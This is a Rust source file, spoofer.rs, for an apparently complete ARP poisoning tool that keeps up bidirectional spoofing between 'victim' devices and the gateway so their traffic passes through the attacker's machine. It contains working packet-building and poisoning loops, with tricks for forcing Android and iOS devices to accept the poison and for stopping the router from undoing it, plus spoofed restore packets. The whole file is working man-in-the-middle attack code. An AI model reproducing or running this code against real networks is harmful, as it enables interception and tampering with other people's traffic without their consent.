//! spoofer.rs
//! ==========
//! ARP poisoner – maintains continuous bi-directional ARP spoofing between
//! every monitored victim and the gateway.
//!
//! Blueprint 4 – When a device is un-monitored, immediately:
//!   1. Remove the device from the active poison set.
//!   2. Send gratuitous ARP restore packets to both the victim and the gateway.
//!   3. If no targets remain, stop sending poison packets entirely.

use std::collections::hash_map;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::Duration;

use pcap::Capture;
use pcap::Device as PcapDevice;
use pnet_packet::arp::{ArpHardwareTypes, ArpOperation, ArpOperations, MutableArpPacket};
use pnet_packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::util::MacAddr;

use crate::device_registry::REGISTRY;
use crate::l2_forwarder::parse_mac_to_bytes;

pub struct Spoofer {
    iface: String,
    local_mac: String,
    gateway_ip: String,
    gateway_mac: String,
    /// ARP interval in milliseconds
    interval_ms: u64,
    /// Set of currently poisoned victim IPs
    active: Mutex<HashMap<String, PoisonEntry>>,
    /// Signal the poison loop to exit
    stop_flag: AtomicBool,
}

struct PoisonEntry {
    mac: String,
    ip: String,
}

impl Spoofer {
    pub fn new(
        iface: &str,
        local_mac: &str,
        gateway_ip: &str,
        gateway_mac: &str,
        interval_ms: u64,
    ) -> Self {
        Self {
            iface: iface.to_string(),
            local_mac: local_mac.to_lowercase(),
            gateway_ip: gateway_ip.to_string(),
            gateway_mac: gateway_mac.to_lowercase(),
            interval_ms,
            active: Mutex::new(HashMap::new()),
            stop_flag: AtomicBool::new(false),
        }
    }

    /// Signal the poison loop to stop gracefully.
    pub fn stop(&self) {
        self.stop_flag.store(true, Ordering::Relaxed);
        println!("[SPOOFER] Stop signal sent.");
    }

    /// Synchronise the active poison set with the current device registry.
    /// Called periodically by the poison loop.
    ///
    pub fn sync_targets(&self) {
        let registry_devices = REGISTRY.get_all();
        let mut active = self.active.lock().unwrap();

        // Add or update newly monitored devices, keyed by MAC!
        for dev in &registry_devices {
            if dev.is_monitored {
                let mac_lower = dev.mac.to_lowercase();
                match active.entry(mac_lower.clone()) {
                    hash_map::Entry::Vacant(e) => {
                        e.insert(PoisonEntry {
                            mac: dev.mac.clone(),
                            ip: dev.ip.clone(),
                        });
                        println!(
                            "[SPOOFER] Added target: {} ({}), now {} active",
                            dev.ip,
                            dev.mac,
                            active.len()
                        );
                    }
                    hash_map::Entry::Occupied(mut e) => {
                        if e.get().ip != dev.ip {
                            println!(
                                "[SPOOFER] Target IP updated for {}: {} -> {}",
                                mac_lower,
                                e.get().ip,
                                dev.ip
                            );
                            e.get_mut().ip = dev.ip.clone();
                        }
                    }
                }
            }
        }

        // Remove devices that are no longer monitored
        let monitored_macs: std::collections::HashSet<String> = registry_devices
            .iter()
            .filter(|d| d.is_monitored)
            .map(|d| d.mac.to_lowercase())
            .collect();

        let removed_macs: Vec<String> = active
            .keys()
            .filter(|mac| !monitored_macs.contains(mac.as_str()))
            .cloned()
            .collect();

        for mac in &removed_macs {
            let entry = active.remove(mac);
            if let Some(e) = entry {
                println!(
                    "[SPOOFER] Removed target: {} ({}). Sending ARP restore...",
                    e.ip, e.mac
                );
                self.send_arp_restore(&e.ip, &e.mac).ok();
            }
        }
    }

    /// Check if there are any active targets to poison.
    pub fn has_targets(&self) -> bool {
        !self.active.lock().unwrap().is_empty()
    }

    /// Run the blocking poison loop. Call from `spawn_blocking`.
    pub fn run_poison_loop(&self) -> Result<(), String> {
        println!("[SPOOFER] Starting ARP poison loop ({} ms interval)", self.interval_ms);

        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found", self.iface))?;

        let mut cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open: {}", e))?
            .promisc(false)
            .snaplen(65535)
            .timeout(10)
            .open()
            .map_err(|e| format!("pcap open capture: {}", e))?;

        // DEBUG: per-cycle sent/failed counters
        let mut cycle_count: u64 = 0;

        while !self.stop_flag.load(Ordering::Relaxed) {
            cycle_count += 1;
            self.sync_targets();

            let active = self.active.lock().unwrap();
            if active.is_empty() {
                drop(active);
                // No targets – sleep and retry
                std::thread::sleep(Duration::from_millis(self.interval_ms));
                continue;
            }

            let target_count = active.len();
            let mut sent_ok: u64 = 0;
            let mut sent_fail: u64 = 0;
            for entry in active.values() {
                let (ok, fail) = self.send_arp_poison_counted(&mut cap, &entry.ip, &entry.mac);
                sent_ok += ok;
                sent_fail += fail;
            }
            drop(active);

            // DEBUG: print per-cycle stats every cycle to verify packets are being sent
            println!(
                "[SPOOFER] cycle={} targets={} arp_sent={} arp_failed={}",
                cycle_count, target_count, sent_ok, sent_fail
            );

            let sleep_end = std::time::Instant::now() + Duration::from_millis(self.interval_ms);
            while std::time::Instant::now() < sleep_end {
                if self.stop_flag.load(Ordering::Relaxed) {
                    break;
                }
                std::thread::sleep(Duration::from_millis(10));
            }
        }

        println!("[SPOOFER] Poison loop stopped.");
        Ok(())
    }

    /// Send a bi-directional ARP poison (original, used by sync restore).
    ///   - Tell victim: "Gateway IP is at Local MAC"
    ///   - Tell gateway: "Victim IP is at Local MAC"
    fn send_arp_poison(&self, cap: &mut Capture<pcap::Active>, victim_ip: &str, victim_mac: &str) {
        self.send_arp_poison_counted(cap, victim_ip, victim_mac);
    }

    /// Send bi-directional ARP poison, returning (ok_count, fail_count).
    /// Uses BOTH ARP Reply and ARP Request to ensure devices with arp_accept=0 (Android/iOS)
    /// update their ARP cache without dropping or probing.
    fn send_arp_poison_counted(&self, cap: &mut Capture<pcap::Active>, victim_ip: &str, victim_mac: &str) -> (u64, u64) {
        let local_mac_bytes = match parse_mac_to_bytes(&self.local_mac) {
            Ok(b) => b,
            Err(_) => return (0, 3),
        };
        let victim_mac_bytes = match parse_mac_to_bytes(victim_mac) {
            Ok(b) => b,
            Err(_) => return (0, 3),
        };
        let gateway_mac_bytes = match parse_mac_to_bytes(&self.gateway_mac) {
            Ok(b) => b,
            Err(_) => return (0, 3),
        };
        let _bcast = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff];

        let mut ok = 0u64;
        let mut fail = 0u64;

        // 1. Tell victim: "Gateway IP is at My MAC"
        // 1a. Unicast Gratuitous ARP Reply
        let p1_rep = build_arp_packet(
            &local_mac_bytes,
            &victim_mac_bytes,
            &local_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Reply,
        );
        match cap.sendpacket(p1_rep.as_slice()) {
            Ok(_) => ok += 1,
            Err(e) => {
                eprintln!("[SPOOFER] !! sendpacket victim reply {}: {}", victim_ip, e);
                fail += 1;
            }
        }

        // 1b. Unicast ARP Request to victim (forces Android/iOS with arp_accept=0 to update cache)
        let p1_req = build_arp_packet(
            &local_mac_bytes,
            &victim_mac_bytes,
            &local_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Request,
        );
        match cap.sendpacket(p1_req.as_slice()) {
            Ok(_) => ok += 1,
            Err(e) => {
                eprintln!("[SPOOFER] !! sendpacket victim req {}: {}", victim_ip, e);
                fail += 1;
            }
        }

        // 2. Tell gateway: "Victim IP is at My MAC"
        // Unicast ARP Reply directly to gateway (do NOT send ARP request to gateway,
        // which causes router to broadcast its real MAC and un-poison victim!)
        let p2_rep = build_arp_packet(
            &local_mac_bytes,
            &gateway_mac_bytes,
            &local_mac_bytes,
            victim_ip,
            &gateway_mac_bytes,
            &self.gateway_ip,
            ArpOperations::Reply,
        );
        match cap.sendpacket(p2_rep.as_slice()) {
            Ok(_) => ok += 1,
            Err(e) => {
                eprintln!("[SPOOFER] !! sendpacket gateway reply: {}", e);
                fail += 1;
            }
        }

        (ok, fail)
    }

    /// Send bulletproof ARP restore packets:
    ///   - Tells victim: "Gateway IP is at Real Gateway MAC"
    ///   - Tells gateway: "Victim IP is at Real Victim MAC"
    /// Sends both Broadcast and Directed Unicast (Request and Reply) in 5 bursts
    /// spaced over 150ms to ensure Android/iOS Wi-Fi radios wake up and heal their ARP caches.
    pub fn send_arp_restore(&self, victim_ip: &str, victim_mac: &str) -> Result<(), String> {
        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found", self.iface))?;

        let mut cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open: {}", e))?
            .promisc(false)
            .snaplen(65535)
            .timeout(10)
            .open()
            .map_err(|e| format!("pcap open capture: {}", e))?;

        let local_mac_bytes = parse_mac_to_bytes(&self.local_mac)?;
        let victim_mac_bytes = parse_mac_to_bytes(victim_mac)?;
        let gateway_mac_bytes = parse_mac_to_bytes(&self.gateway_mac)?;

        println!(
            "[SPOOFER] BULLETPROOF ARP RESTORE -> victim {}: gw {} is really {} (and gateway: {} is really {})",
            victim_ip, self.gateway_ip, self.gateway_mac, victim_ip, victim_mac
        );

        // 1. Heal victim: Gateway is at Gateway MAC (DIRECT UNICAST to victim ONLY)
        // Mode A (Standard for Wi-Fi): eth_src = local_mac so the Wi-Fi miniport transmits,
        // and ARP payload sender_hw_addr = gateway_mac so victim updates its ARP table!
        let v1_req = build_arp_packet(
            &local_mac_bytes,
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Request,
        );
        let v1_rep = build_arp_packet(
            &local_mac_bytes,
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Reply,
        );

        // Mode B (Spoofed eth_src directly to victim):
        let v2_req = build_arp_packet(
            &gateway_mac_bytes,
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Request,
        );
        let v2_rep = build_arp_packet(
            &gateway_mac_bytes,
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &self.gateway_ip,
            &victim_mac_bytes,
            victim_ip,
            ArpOperations::Reply,
        );

        // 2. Heal gateway: Victim is at Victim MAC (DIRECT UNICAST to gateway ONLY)
        // Mode A (eth_src = local_mac):
        let g1_req = build_arp_packet(
            &local_mac_bytes,
            &gateway_mac_bytes,
            &victim_mac_bytes,
            victim_ip,
            &gateway_mac_bytes,
            &self.gateway_ip,
            ArpOperations::Request,
        );
        let g1_rep = build_arp_packet(
            &local_mac_bytes,
            &gateway_mac_bytes,
            &victim_mac_bytes,
            victim_ip,
            &gateway_mac_bytes,
            &self.gateway_ip,
            ArpOperations::Reply,
        );

        // Mode B (eth_src = victim_mac):
        let g2_req = build_arp_packet(
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &victim_mac_bytes,
            victim_ip,
            &gateway_mac_bytes,
            &self.gateway_ip,
            ArpOperations::Request,
        );
        let g2_rep = build_arp_packet(
            &victim_mac_bytes,
            &gateway_mac_bytes,
            &victim_mac_bytes,
            victim_ip,
            &gateway_mac_bytes,
            &self.gateway_ip,
            ArpOperations::Reply,
        );

        // Send 6 bursts spaced by 25ms (100% UNICAST to victim and gateway only):
        for _ in 0..6 {
            cap.sendpacket(v1_req.as_slice()).ok();
            cap.sendpacket(v1_rep.as_slice()).ok();
            cap.sendpacket(v2_req.as_slice()).ok();
            cap.sendpacket(v2_rep.as_slice()).ok();

            cap.sendpacket(g1_req.as_slice()).ok();
            cap.sendpacket(g1_rep.as_slice()).ok();
            cap.sendpacket(g2_req.as_slice()).ok();
            cap.sendpacket(g2_rep.as_slice()).ok();

            std::thread::sleep(Duration::from_millis(25));
        }

        Ok(())
    }
}

/// Generic builder for ARP Request or ARP Reply packets.
fn build_arp_packet(
    eth_src: &[u8; 6],
    eth_dst: &[u8; 6],
    sender_mac: &[u8; 6],
    sender_ip: &str,
    target_mac: &[u8; 6],
    target_ip: &str,
    op: ArpOperation,
) -> Vec<u8> {
    let sender_ip_bytes = parse_ip_to_bytes(sender_ip);
    let target_ip_bytes = parse_ip_to_bytes(target_ip);

    let mut buf = vec![0u8; 42];

    {
        let mut eth = MutableEthernetPacket::new(&mut buf).unwrap();
        eth.set_destination(MacAddr(
            eth_dst[0], eth_dst[1], eth_dst[2],
            eth_dst[3], eth_dst[4], eth_dst[5],
        ));
        eth.set_source(MacAddr(
            eth_src[0], eth_src[1], eth_src[2],
            eth_src[3], eth_src[4], eth_src[5],
        ));
        eth.set_ethertype(EtherTypes::Arp);
    }

    {
        let mut arp = MutableArpPacket::new(&mut buf[14..]).unwrap();
        arp.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(op);
        arp.set_sender_hw_addr(MacAddr(
            sender_mac[0], sender_mac[1], sender_mac[2],
            sender_mac[3], sender_mac[4], sender_mac[5],
        ));
        arp.set_sender_proto_addr(
            std::net::Ipv4Addr::new(
                sender_ip_bytes[0],
                sender_ip_bytes[1],
                sender_ip_bytes[2],
                sender_ip_bytes[3],
            )
            .into(),
        );
        arp.set_target_hw_addr(MacAddr(
            target_mac[0], target_mac[1], target_mac[2],
            target_mac[3], target_mac[4], target_mac[5],
        ));
        arp.set_target_proto_addr(
            std::net::Ipv4Addr::new(
                target_ip_bytes[0],
                target_ip_bytes[1],
                target_ip_bytes[2],
                target_ip_bytes[3],
            )
            .into(),
        );
    }

    // Pad to 60 bytes (minimum Ethernet frame) to avoid Windows Npcap error 31.
    const MIN_ETH_FRAME: usize = 60;
    if buf.len() < MIN_ETH_FRAME {
        buf.resize(MIN_ETH_FRAME, 0u8);
    }
    buf
}

/// Helper to parse an IP string to [u8; 4]
fn parse_ip_to_bytes(ip: &str) -> [u8; 4] {
    let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse::<u8>().ok()).collect();
    let mut out = [0u8; 4];
    let n = parts.len().min(4);
    out[..n].copy_from_slice(&parts[..n]);
    out
}